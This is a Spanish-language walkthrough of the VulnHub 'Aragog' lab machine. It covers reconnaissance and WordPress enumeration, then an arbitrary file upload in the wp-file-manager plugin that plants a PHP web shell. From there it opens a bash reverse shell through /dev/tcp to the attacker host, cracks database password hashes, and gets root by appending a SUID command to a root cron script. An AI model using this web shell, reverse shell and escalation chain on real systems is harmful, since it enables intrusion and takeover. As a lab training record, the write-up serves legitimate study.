---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/aragog
dificultad: Fácil
os: Linux
relacionados:
  - "[[nikto]]"
  - "[[wpscan]]"
  - "[[Arbitrary File Upload]]"
  - "[[base64]]"
  - "[[SUID]]"
  - "[[sudo]]"
  - "[[Codificación]]"
---
#  Vulnhub - Aragog

## RECONOCIMIENTO

### Escaneo de red

- **arp-scan**:  
    Identifico hosts activos en la red.
    
- **nmap**:  
    Realizo un escaneo de puertos para identificar servicios y versiones.
    
- **ping**:
    Compruebo la conectividad con el host.
    ```bash
    ping -c 1 <IP>
    ```

    
### Enumeración de servicios web

- **whatweb**:
    Identifico la tecnología y versión del servicio web.
    ```bash
    whatweb <IP>
    ```

    
- **nikto**:
    Busco vulnerabilidades comunes en el servidor web.
    ```bash
    nikto -host http://<IP>
    ```
    
- **curl**:
    Descargo algún recurso o imagen para analizarlo.
    ```bash
    curl -O <imagen>
    ```


### Búsquedas en fuentes externas

- Mediante búsquedas en Google busco información adicional:

    `"launchpad OpenSSH 7.9p1 Debian 10+deb10u2"` y `"launchpad Apache httpd 2.4.38"`.  
    Ambas búsquedas devolvieron como resultado `Ubuntu Buster`, lo que me inclinó a pensar que no se utilizan contenedores.

---

## ANÁLISIS DE VULNERABILIDADES

### Enumeración de directorios con Gobuster

Utilicé `gobuster` para buscar directorios ocultos:
```bash
gobuster dir -u http://172.16.217.136/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -t 20 -x html,php,txt
```

- Al inspeccionar el código fuente encuentro en `/etc/hosts` la siguiente línea:
    ```
    172.16.217.136  wordpress.aragog.hogwarts
    ```
    Esto indica que el sitio WordPress era accesible mediante ese hostname.
    
- Una segunda ejecución de gobuster reveló la existencia de la ruta `/blog`.
    

### Escaneo específico de WordPress con WPScan

Uso **[[wpscan]]** para enumerar usuarios y vulnerabilidades en la instalación de WordPress:
```bash
wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp
```

- Encuentro al usuario `wp-admin`, pero el escaneo inicial no mostró información relevante.
    
- Para mejorar la exhaustividad del escaneo, puedo registrarme en [wpscan.com](https://wpscan.com/register) obtener un **API Token**:
    ```bash
    wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --api-token=<token>
    ```
    
- Con el nuevo escaneo aparecen plugins vulnerables, destacándose uno con una vulnerabilidad de **[[Arbitrary File Upload]]** (ver [CVE](https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9)).
    

---

## EXPLOTACIÓN DE VULNERABILIDADES

### Preparación y ejecución del exploit

1. **Descarga del script de PoC:**  
    Descargo la prueba de concepto que permite subir archivos arbitrarios:
    ```bash
    wget https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py
    ```
    
2. **Creación del payload:**  
    Dado que el script intenta subir un archivo llamado `payload.php` que no existe, creo el siguiente archivo PHP que permite ejecutar comandos arbitrarios:
    ```php
    <?php
            system ($_GET['cmd']);
    ?>
    ```
    
3. **Ejecución del exploit:**  
    Ejecuto el script para subir el payload:
    ```bash
    ./2020-wp-file-manager-v67.py http://wordpress.aragog.hogwarts/blog/
    ```
    

### Verificación y obtención de shell

- Veo el funcionamiento del payload accediendo a:
    ```bash
    http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami
    ```
    
    o mediante:
    ```bash
    curl -X GET "http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=whoami"
    ```
    Lo cual devolve el usuario del sistema.
    
- **Obtención de una reverse shell:**  

    Mando una sesión con **netcat**:
    ```bash
    nc -lpvn 443
    ```
    
    Ejecuto el siguiente comando para obtener la reverse shell:
    ```bash
    curl -X GET "http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.16.217.128/443+0>%261'"
    ```
    
> [!TIP]
> El carácter `&` se codifica como `%26` en las URLs para evitar problemas de interpretación.


---

## ESCALADA DE PRIVILEGIOS

### Exploración post-explotación

- Dentro del usuario `hagrid98`, encuentro el archivo `horcrux1.txt` con el siguiente contenido:
    ```
	horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
    ```
    
    Lo decodifico en [[Base64]]:
    ```bash
    echo "MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==" | base64 -d; echo
    ```
    
    Obtengo:
    ```
    1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
    ```
    
- Dado que el sitio web era un WordPress, busco el archivo `wp-config.php` para extraer credenciales de la base de datos.  

    Al inspeccionar la configuración de Apache:
    ```bash
    ls /etc/apache2/sites-enabled/
    ```
    
    Encuentro el archivo `wordpress.conf`, cuyo contenido apunta a:
    ```
    /usr/share/wordpress
    ```
    
    Veo el `wp-config.php`, el cual indica que las credenciales reales se encontraban en:
    ```
    /etc/wordpress/config-default.php
    ```
    

### Acceso a la base de datos y obtención de credenciales

- Ingreso a [[MySQL]]:
    ```bash
    mysql -u root -p
    ```
    
- Dentro de la base de datos **wordpress**, reviso la tabla `wp_users`:
    ```sql
    use wordpress;
    describe wp_users;
    select * from wp_users;
    ```
    
- Encuentro una contraseña hasheada para el usuario, la cual fue extraída y posteriormente crackeada utilizando **John the Ripper**:
    ```bash
    john -w:$(locate rockyou.txt) <hash>
    ```
    
- Con la contraseña obtenida, accedo al sistema mediante **SSH**:
    ```bash
    ssh hagrid98@<ip>
    ```
    

### Escalada de privilegios local

- Verifico la versión del sistema:
    ```bash
    lsb_release -a
    ```
    Resultando en **Debian Buster**.
    
- Busco binarios [[SUID]] con `find`:
    ```bash
    find / -perm -4000 2>/dev/null
    ```
    Sin resultados interesantes.
    
- Exploro el directorio del usuario `hagrid98`:
    ```bash
    find / -user hagrid98 2>/dev/null
    ```
    
    Encuentro el script:
    ```
    /opt/backup.sh
    ```
    
    Este script realizaba una copia recursiva:
    ```bash
    cp -r /usr/share/wordpress/wp-content/uploads /tmp/tmp_wp_uploads
    ```
    Observo que el directorio `/tmp/tmp_wp_uploads` era propiedad de **root**.
    
- Supuse que el script `.backup.sh` se ejecutaba mediante un [[Cron]] job con privilegios de root.  
    Para aprovecharse de ello, añado una línea al final del script que otorga el bit SUID a `/bin/bash`:
    
    ```bash
    echo 'chmod u+s /bin/bash' >> /opt/.backup.sh
    ```
    En pocos segundos, obtengo SUID sobre `bash`.
    
- Ejecuto una shell privilegiada:
    ```bash
    bash -p
    ```
    

### Obtención de la flag de root

- Accedo al directorio **root** y leo el archivo `horcrux2.txt`:
    ```bash
    cd /root
    cat horcrux2.txt | tail -n 7 | head -n 1 | awk -F{ '{print $2}' | head -c 64 | base64 -d; echo
    ```
    
    El resultado es:
    ```
    2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
    ```
    

---

## Bandera(s)

> [!FLAG] `flag{hagrid98}`
> 1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
^bandera


> [!FLAG] `flag{root}`
> 2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre
^bandera